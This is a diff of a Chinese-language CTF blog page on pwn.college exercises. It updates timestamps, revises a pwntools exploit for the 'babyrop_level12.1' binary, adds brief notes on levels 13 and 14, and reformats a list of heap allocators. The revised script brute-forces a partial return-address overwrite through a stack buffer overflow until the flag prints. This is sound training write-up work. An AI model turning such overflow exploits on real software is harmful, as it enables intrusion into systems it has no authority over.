@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220508231821229.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505165437735.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-10T12:45:17.646Z">
+<meta property="article:modified_time" content="2022-05-10T16:14:11.112Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -231,7 +231,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      822 分钟
+      824 分钟
     </span>
   
 
@@ -272,7 +272,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月10日 晚上
+                  不可视境界线最后变动于：2022年5月11日 凌晨
                 
               </p>
             
@@ -1627,21 +1627,25 @@
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#这个是main函数的返回地址</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x7efef009a7ed</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7efef0099000</span>     <span class="hljs-number">0x7efef01e1000</span> r-xp   <span class="hljs-number">148000</span> <span class="hljs-number">26000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2.33</span>.so +<span class="hljs-number">0x17ed</span><br>    <br><span class="hljs-comment">#到libc初始的偏移是`0x277ed`:</span><br>pwndbg&gt; distance <span class="hljs-number">0x7f6b0c0fb000</span> <span class="hljs-number">0x7f6b0c1227ed</span><br>	<span class="hljs-number">0x7f6b0c0fb000</span>-&gt;<span class="hljs-number">0x7f6b0c1227ed</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x277ed</span> <span class="hljs-built_in">bytes</span> (<span class="hljs-number">0x4efd</span> words)<br></code></pre></div></td></tr></table></figure>
 
-<p>诶得256分之1的几率啊, 这也太低了点, 不过想不出来了, 就这么干.</p>
+<p>诶得16*16*16分之1的几率啊, 这也太低了点, 不过想不出来了, 就这么干. <code>0x254000+0x4e250=0x2A2250</code> </p>
 <blockquote>
 <p><del>又发现地址好像和libc没什么关系, 是紧挨着ld.so的…</del> 这个方向错了</p>
 <img src="../../image/pwn-modules/image-20220508231821229.png" srcset="/img/loading.gif" lazyload alt="image-20220508231821229" style="zoom:67%;" /> 
 </blockquote>
 <p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *                                   <br>binary = <span class="hljs-string">&#x27;./babyrop_level12.1.elf64&#x27;</span>                <br>context.binary = binary                             <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>                         <br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):                                        <br>    p = process(binary)                             <br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;                                        </span><br><span class="hljs-string">    b *main+0x19f                                   </span><br><span class="hljs-string">    init-pwndbg                                     </span><br><span class="hljs-string">    lm                                              </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>                                             <br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)                     </span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)                  <br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)                       <br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">8</span>), <span class="hljs-string">b&#x27;\x8b\x79&#x27;</span>])   <br>                                                    <br>    p.send(pl)                                      <br>    <span class="hljs-built_in">all</span> = p.recvall()                               <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:                              <br>        <span class="hljs-keyword">break</span>                                       <br>    <span class="hljs-keyword">else</span>:.                                          <br>        p.kill()                                    <br></code></pre></div></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level12.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *main+0x19f</span><br><span class="hljs-string">    init-pwndbg</span><br><span class="hljs-string">    lm</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x50\x22\x2a&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        p.kill()<br></code></pre></div></td></tr></table></figure>
 
-<h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><p>Dynamic Allocators:</p>
+<h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><p>看看这题又要搞什么幺蛾子.</p>
+<p>保护全开, 给出buf位置, 可以leak任意一个地址上8字节数据.</p>
+<p>???这不leak一个canary出来, 然后返回地址改成….和上一题一样了.</p>
+<h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14"></a>level14</h4><p>socket</p>
+<h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><p>Dynamic Allocators:</p>
 <ul>
-<li><strong>General Purpose:</strong> Doug Lea (pictured) releases dlmalloc into public domain in 1987.</li>
-<li><strong>Linux:</strong> ptmalloc (<strong>P</strong>osix <strong>T</strong>hread aware fork of dlmalloc)</li>
-<li><strong>FreeBSD:</strong> jemalloc (also used in Firefox, Android)</li>
-<li><strong>Windows:</strong> Segment Heap, NT Heap</li>
-<li><strong>Kernel allocators:</strong> kmalloc (Linux kernel memory allocator)kalloc (iOS kernel memory allocator)</li>
+<li>General Purpose: Doug Lea (pictured) releases <strong>dlmalloc</strong> into public domain in 1987.</li>
+<li>Linux: <strong>ptmalloc</strong> (Posix Thread aware fork of dlmalloc)</li>
+<li>FreeBSD: <strong>jemalloc</strong> (also used in Firefox, Android)</li>
+<li>Windows: Segment Heap, <strong>NT Heap</strong></li>
+<li>Kernel allocators: <strong>kmalloc</strong> (Linux kernel memory allocator)kalloc (iOS kernel memory allocator)</li>
 </ul>
 <p>managed by the brk and sbrk system calls:</p>
 <ul>
